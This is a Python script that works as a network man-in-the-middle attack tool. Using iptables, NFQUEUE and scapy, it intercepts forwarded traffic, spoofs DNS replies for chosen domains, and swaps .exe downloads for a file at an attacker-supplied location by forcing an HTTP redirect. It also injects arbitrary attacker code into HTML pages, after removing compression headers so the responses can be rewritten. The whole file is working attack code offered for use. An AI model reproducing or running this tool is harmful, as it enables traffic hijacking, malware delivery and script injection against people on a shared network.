import argparse
import re
import subprocess
import netfilterqueue
import scapy.all as scapy


class NetfilterqueueAttacks:
    def __init__(self, domains_dict, location, code):
        self.queue_num = 0
        self.domains_dict = domains_dict
        self.location = location
        self.injection_code = code
        self.ack_list = []

    def trap_packets(self):
        print("[+] Trapping incoming packets into NFQUEUE.....")
        subprocess.call(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}", shell=True)

    def run(self):
        self.trap_packets()
        print("[+] Intercepting packets\n")
        # Initialize and access the queue
        self.queue = netfilterqueue.NetfilterQueue()
        self.queue.bind(int(self.queue_num), self.process_packet)
        self.queue.run()

    def set_load(self, scapy_packet, load):
        scapy_packet[scapy.Raw].load = load
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.TCP].chksum
        return scapy_packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        # Run DNS spoofer or not
        if self.domains_dict:
            if scapy_packet.haslayer(scapy.DNSRR):
                qname = scapy_packet[scapy.DNSQR].qname
                for key, value in self.domains_dict.items():
                    if key in qname.decode():
                        print("[+] DNS Spoofer: Spoofing target: " + key + " >> " + value)
                        # Modify DNS Response
                        answer = scapy.DNSRR(rrname=qname, rdata=value)
                        scapy_packet[scapy.DNS].an = answer
                        scapy_packet[scapy.DNS].ancount = 1
                        # Recalculate the len and checksum
                        del scapy_packet[scapy.IP].len
                        del scapy_packet[scapy.IP].chksum
                        del scapy_packet[scapy.UDP].len
                        del scapy_packet[scapy.UDP].chksum
                        # Modify the original packet
                        packet.set_payload(bytes(scapy_packet))
        try:
            # Run Download replacer or not
            if self.location:
                # if raw layer is available, the data is what we are looking for
                if scapy_packet.haslayer(scapy.Raw):
                    # searching http requests
                    if scapy_packet[scapy.TCP].dport == 80:
                        # if target is downloading .exe file, get the http request packet
                        if ".exe" in str(scapy_packet[scapy.Raw].load) and \
                                self.location not in str(scapy_packet[scapy.Raw].load):
                            print("[+] Download Replacer: .exe Request detected")
                            # print(scapy_packet.show())
                            # save the ack to find the http response for the packet later
                            self.ack_list.append(scapy_packet[scapy.TCP].ack)
                    # searching http responses
                    elif scapy_packet[scapy.TCP].sport == 80:
                        # if the http response is the response of the .exe file request
                        if scapy_packet[scapy.TCP].seq in self.ack_list:
                            # remove the current ack record in the list
                            self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                            # print("[+] Download Replacer: Replacing file >> " + self.location)
                            # Redirect the download address to another
                            load = f"HTTP/1.1 301 Moved Permanently\nLocation: {self.location}\n\n"
                            modified_packet = self.set_load(scapy_packet, load)

                            packet.set_payload(bytes(modified_packet))
                            print("[+] Download Replacer: File replaced >> " + self.location)
        except IndexError:
            pass
        finally:
            # Run Code injector or not
            if self.injection_code:
                try:
                    # if raw layer is available, the data is what we are looking for
                    if scapy_packet.haslayer(scapy.Raw):
                        load = None
                        # Some characters in some loads can't be converted to string, but those are not html,
                        # so just handle the error and ignore them
                        try:
                            load = scapy_packet[scapy.Raw].load.decode()
                            # searching http requests
                            if scapy_packet[scapy.TCP].dport == 80:
                                # print("[+] HTTP Request detected")
                                # print(scapy_packet.show())
                                # Delete Accept-Encoding header in the load, so the http responses will be in plain text
                                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                                # Use HTTP/1.0
                                load = load.replace("HTTP/1.1", "HTTP/1.0")

                            # searching http responses
                            elif scapy_packet[scapy.TCP].sport == 80:
                                # print("[+] HTTP Response detected")
                                # print(scapy_packet.show())
                                # Put the injection code at the </body> tag
                                load = load.replace("</body>", self.injection_code + "</body>")
                                # Changing the Content-Length header
                                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                                # Only change the content length if the response contains html
                                if content_length_search and "text/html" in load:
                                    # Group 0 will return 'Content-Length: x', Group 1 will only return 'x'
                                    content_length = content_length_search.group(1)
                                    # Get new content length: original content length + injection_code content length
                                    new_content_length = int(content_length) + len(self.injection_code)
                                    load = load.replace(content_length, str(new_content_length))

                            # If load is changed
                            if load != scapy_packet[scapy.Raw].load.decode():
                                modified_packet = self.set_load(scapy_packet, load)
                                packet.set_payload(bytes(modified_packet))
                                print("[+] Code Injector: A HTTP Request/Response is modified")
                        except UnicodeDecodeError:
                            pass
                except IndexError:
                    pass
                finally:
                    packet.accept()
            else:
                packet.accept()


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domains", dest="domains", help="The target IP address to be spoofed")
    parser.add_argument("-l", "--location", dest="location", help="The location of the file to be uploaded")
    parser.add_argument("-c", "--code", dest="code", help="The code to be injected")
    options = parser.parse_args()

    return options


options = get_arguments()

location = None
code = None
domains_dict = None
# For DNS spoofer
if options.domains != "emptynullnone":
    print("[+] DNS Spoofer is loaded")
    domains = options.domains
    domains = domains.split("~")
    domains_dict = {}
    for domain in domains:
        key_and_value = domain.split(",")
        try:
            domains_dict[key_and_value[0]] = key_and_value[1]
        except IndexError:
            print(
                "[-] IndexError detected, it might be caused by a wrong input format or an extra newline at the end of "
                "the input (it is fine), automatically ignore it..")
            print("[-] Please check the example of the DNS Spoofer input, if you entered a wrong input format, "
                  "the DNS Spoofer won't work properly! ")
# For download replacer
if options.location != "emptynullnone":
    print("[+] Download Replacer is loaded")
    location = options.location
# For code injector
if options.code != "emptynullnone":
    print("[+] Code Injector is loaded")
    code = options.code
print()
# Start Netfilterqueue Attacker
attacker = NetfilterqueueAttacks(domains_dict, location, code)
attacker.run()
